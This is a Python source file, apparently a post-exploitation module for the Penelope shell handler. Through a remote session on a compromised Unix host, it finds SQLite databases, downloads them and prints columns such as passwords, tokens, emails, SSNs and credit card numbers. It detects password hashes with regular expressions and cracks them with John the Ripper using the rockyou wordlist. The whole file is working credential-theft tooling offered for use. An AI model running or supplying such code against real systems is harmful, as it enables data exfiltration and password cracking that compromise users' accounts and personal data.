import penelope
import sqlite3
import re
import shutil
import subprocess
import tempfile
import pathlib

SENSITIVE = {
    'user', 'username', 'email', 'password', 'passwd', 'pass', 'hash',
    'token', 'secret', 'api_key', 'key', 'ssn', 'credit_card', 'phone',
    'flag', 'admin', 'auth', 'credential', 'private'
}

LABEL_PRIORITY = ['username', 'user', 'login', 'name', 'email']

HASH_PATTERNS = [
    (re.compile(r'^\$2[aby]\$\d+\$.{53}$'),    'bcrypt',      'bcrypt'),
    (re.compile(r'^\$6\$'),                      'sha512crypt', 'sha512crypt'),
    (re.compile(r'^\$5\$'),                      'sha256crypt', 'sha256crypt'),
    (re.compile(r'^\$1\$'),                      'md5crypt',    'md5crypt'),
    (re.compile(r'^[0-9a-fA-F]{128}$'),          'sha512',      'Raw-SHA512'),
    (re.compile(r'^[0-9a-fA-F]{64}$'),           'sha256',      'Raw-SHA256'),
    (re.compile(r'^[0-9a-fA-F]{40}$'),           'sha1',        'Raw-SHA1'),
    (re.compile(r'^[0-9a-fA-F]{32}$'),           'md5',         'Raw-MD5'),
]

def _detect_hash(value):
    for pattern, name, john_fmt in HASH_PATTERNS:
        if pattern.match(str(value).strip()):
            return name, john_fmt
    return None, None

def _pick_label_col(col_names):
    lower = [c.lower() for c in col_names]
    for want in LABEL_PRIORITY:
        for i, c in enumerate(lower):
            if want == c or want in c:
                return i
    return None

def _table_rows(cur, table, sensitive_cols):
    col_select = ', '.join(f'"{c}"' for c in sensitive_cols)
    rows = cur.execute(f'SELECT {col_select} FROM "{table}" LIMIT 50').fetchall()
    if not rows:
        return []
    widths = [max(len(c), max(len(str(r[i])) for r in rows)) for i, c in enumerate(sensitive_cols)]
    fmt = '  ' + '  '.join(f'{{:<{w}}}' for w in widths)
    print(fmt.format(*sensitive_cols))
    print('  ' + '  '.join('-' * w for w in widths))
    for row in rows:
        print(fmt.format(*[str(v) for v in row]))
    return rows

def _crack_with_john(hashes_by_fmt, wordlist):
    if not shutil.which('john'):
        print("[-] john not found in PATH")
        return

    for john_fmt, entries in hashes_by_fmt.items():
        print(f"\n[*] Running john ({john_fmt}) on {len(entries)} hash(es)...")
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            hashfile = pathlib.Path(f.name)
            for label, h in entries:
                safe_label = label.replace(':', '_')
                f.write(f'{safe_label}:{h}\n')
        try:
            subprocess.run(
                ['john', f'--format={john_fmt}', f'--wordlist={wordlist}', str(hashfile)],
                capture_output=True
            )
            result = subprocess.run(
                ['john', f'--format={john_fmt}', '--show', str(hashfile)],
                capture_output=True, text=True
            )
            lines = [l for l in result.stdout.splitlines()
                     if ':' in l and not l.startswith('0 ') and not l.startswith('No ')]
            if lines:
                print("[+] Cracked:\n")
                for line in lines:
                    parts = line.split(':')
                    # label:plaintext:hash:...
                    print(f"  {parts[0]:<20}  {parts[1]}")
            else:
                print("[-] No hashes cracked")
        finally:
            hashfile.unlink(missing_ok=True)

class sqlite_dump(penelope.Module):
    category = "Enumeration"

    def run(session, args):
        """
        Find SQLite DBs under cwd, dump structure and sensitive column data. Optionally crack hashes with john.
        Usage: run sqlite_dump [wordlist_path]
        """
        if session.OS != 'Unix':
            penelope.logger.error("Unix only")
            return

        wordlist = (args.strip() if args and args.strip()
                    else '/usr/share/wordlists/rockyou.txt')

        cwd = session.exec("pwd", value=True)
        if not cwd:
            penelope.logger.error("Could not determine cwd")
            return
        cwd = cwd.strip()

        print(f"\n[sqlite_dump] {cwd}")

        raw = session.exec(
            f"find {cwd} -type f \\( -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' \\) 2>/dev/null",
            value=True
        )

        if not raw or not raw.strip():
            print("[-] No SQLite databases found")
            return

        db_paths = [q.strip() for q in raw.strip().splitlines() if q.strip()]
        print(f"[+] Found {len(db_paths)} database(s)\n")

        all_hashes = []  # (label, hash, john_fmt)

        for i, remote_path in enumerate(db_paths, 1):
            print(f"[{i}/{len(db_paths)}] {remote_path}")

            result = session.download(remote_path)
            if not result:
                print("[-] Download failed")
                continue

            local_file = next(iter(result), None)
            if not local_file or not local_file.exists():
                print("[-] Could not locate downloaded file")
                continue

            try:
                con = sqlite3.connect(local_file)
                cur = con.cursor()

                tables = [r[0] for r in cur.execute(
                    "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name"
                ).fetchall()]

                if not tables:
                    print("    (no tables)")
                    con.close()
                    continue

                for table in tables:
                    cols_info = cur.execute(f'PRAGMA table_info("{table}")').fetchall()
                    col_names = [c[1] for c in cols_info]
                    row_count = cur.execute(f'SELECT COUNT(*) FROM "{table}"').fetchone()[0]

                    print(f"\n  table : {table} ({row_count} rows)")
                    print(f"  cols  : {', '.join(col_names)}")

                    sensitive_cols = [c for c in col_names if any(s in c.lower() for s in SENSITIVE)]
                    if sensitive_cols and row_count > 0:
                        print(f"  sensitive: {', '.join(sensitive_cols)}\n")
                        _table_rows(cur, table, sensitive_cols)

                        # collect hashes with labels from full rows
                        label_idx = _pick_label_col(col_names)
                        all_cols = ', '.join(f'"{c}"' for c in col_names)
                        full_rows = cur.execute(f'SELECT {all_cols} FROM "{table}" LIMIT 50').fetchall()
                        for row in full_rows:
                            label = str(row[label_idx]) if label_idx is not None else 'unknown'
                            for val in row:
                                _, john_fmt = _detect_hash(val)
                                if john_fmt:
                                    all_hashes.append((label, str(val).strip(), john_fmt))

                print()
                con.close()

            except sqlite3.DatabaseError as e:
                print(f"[-] Not a valid SQLite database: {e}")

        if all_hashes:
            seen = set()
            hashes_by_fmt = {}
            for label, h, fmt in all_hashes:
                if h not in seen:
                    seen.add(h)
                    hashes_by_fmt.setdefault(fmt, []).append((label, h))

            type_summary = ', '.join(f"{len(v)} {k}" for k, v in hashes_by_fmt.items())
            print(f"[*] {len(seen)} hash(es) detected ({type_summary})")
            answer = penelope.ask("Crack with john? [y/N]: ")
            if answer.strip().lower() == 'y':
                _crack_with_john(hashes_by_fmt, wordlist)
